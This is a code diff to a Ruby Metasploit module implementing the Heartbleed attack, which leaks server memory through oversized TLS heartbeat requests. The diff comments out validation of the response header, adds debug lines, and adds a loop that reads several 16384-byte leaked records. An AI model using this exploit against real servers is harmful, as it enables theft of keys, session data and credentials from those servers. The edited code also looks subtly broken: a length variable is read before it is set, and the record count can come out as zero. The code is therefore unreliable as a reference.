@@ -383,11 +383,14 @@ class Metasploit3 < Msf::Auxiliary
 
     to_receive = length
     data = ''
+    #puts "trying for #{to_receive} bytes"
     while to_receive > 0
       temp = sock.get_once(to_receive, response_timeout)
       break if temp.nil?
 
+      #puts "temp: #{temp.class}"
       data << temp
+      #puts "got #{temp.length} bytes"
       to_receive -= temp.length
     end
     data
@@ -442,47 +445,81 @@ class Metasploit3 < Msf::Auxiliary
     # This actually performs the heartbleed portion
     vprint_status("#{peer} - Sending Heartbeat...")
     sock.put(heartbeat_request(heartbeat_length))
-    hdr = get_data(5)
-    if hdr.nil? || hdr.empty?
-      vprint_error("#{peer} - No Heartbeat response...")
-      return
-    end
+    # hdr = get_data(5)
+    # if hdr.nil? || hdr.empty?
+    #   vprint_error("#{peer} - No Heartbeat response...")
+    #   return
+    # end
 
-    unpacked = hdr.unpack('Cnn')
-    type = unpacked[0]
-    version = unpacked[1] # must match the type from client_hello
-    len = unpacked[2]
+    # unpacked = hdr.unpack('Cnn')
+    # type = unpacked[0]
+    # version = unpacked[1] # must match the type from client_hello
+    # len = unpacked[2]
 
-    # try to get the TLS error
-    if type == ALERT_RECORD_TYPE
-      res = get_data(len)
-      alert_unp = res.unpack('CC')
-      alert_level = alert_unp[0]
-      alert_desc = alert_unp[1]
+    # # try to get the TLS error
+    # if type == ALERT_RECORD_TYPE
+    #   res = get_data(len)
+    #   alert_unp = res.unpack('CC')
+    #   alert_level = alert_unp[0]
+    #   alert_desc = alert_unp[1]
 
-      # http://tools.ietf.org/html/rfc5246#section-7.2
-      case alert_desc
-      when 0x46
-        msg = 'Protocol error. Looks like the chosen protocol is not supported.'
-      else
-        msg = 'Unknown error'
-      end
-      vprint_error("#{peer} - #{msg}")
-      return
-    end
+    #   # http://tools.ietf.org/html/rfc5246#section-7.2
+    #   case alert_desc
+    #   when 0x46
+    #     msg = 'Protocol error. Looks like the chosen protocol is not supported.'
+    #   else
+    #     msg = 'Unknown error'
+    #   end
+    #   vprint_error("#{peer} - #{msg}")
+    #   return
+    # end
 
-    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[tls_version]
-      vprint_error("#{peer} - Unexpected Heartbeat response header (#{to_hex_string(hdr)})")
-      return
-    end
+    # unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[tls_version]
+    #   vprint_error("#{peer} - Unexpected Heartbeat response header (#{to_hex_string(hdr)})")
+    #   return
+    # end
 
     # The RFC specified a max response size of 16384, altough you can read 64KB
     # In some cases the next header is parsed as data, because the returned
     # server reponse length is ignored, which may lead to unexpected behaviour.
     to_receive = heartbeat_length > SAFE_CHECK_MAX_RECORD_LENGTH ? heartbeat_length : len
 
-    heartbeat_data = get_data(to_receive)
-    vprint_status("#{peer} - Heartbeat response - Got #{heartbeat_data.length} of #{to_receive} bytes (requested #{heartbeat_length} bytes)")
+    count = (heartbeat_length / 16384).ceil
+    #puts "Checking for #{count} responses"
+    #puts "RESPS: #{full} #{full*16384} + #{remaining}"
+    heartbeat_data = ''
+    count.times{
+      hdr = get_data(5)
+      unpacked = hdr.unpack('Cnn')
+      type = unpacked[0]
+      version = unpacked[1] # must match the type from client_hello
+      len = unpacked[2]
+
+      if len
+        temp = get_data(len)
+        # puts "Header: #{to_hex_string(hdr)}"
+        # puts "type: #{type}, version: #{version}, len: #{len}"
+        # puts "1st : #{to_hex_string(temp[0..9])}"
+        # puts "last: #{to_hex_string(temp[-10..-1])}"
+        heartbeat_data += temp
+        vprint_status("#{peer} - Heartbeat response - #{temp.length} bytes, expected #{len}")
+      end
+    }
+
+    # hdr = get_data(5)
+    # unpacked = hdr.unpack('Cnn')
+    # type = unpacked[0]
+    # version = unpacked[1] # must match the type from client_hello
+    # len = unpacked[2]
+    # puts "Header: to_hex_string(hdr)"
+
+    # temp = get_data(len)
+    # puts "type: #{type}, version: #{version}, len: #{len}"
+    # puts "1st : #{to_hex_string(temp[0..9])}"
+    # puts "last: #{to_hex_string(temp[-10..-1])}"
+    # vprint_status("#{peer} - Heartbeat response - Got #{heartbeat_data.length} of #{to_receive} bytes (requested #{remaining+1} bytes)")
+    # heartbeat_data += temp
+
     heartbeat_data
   end
 
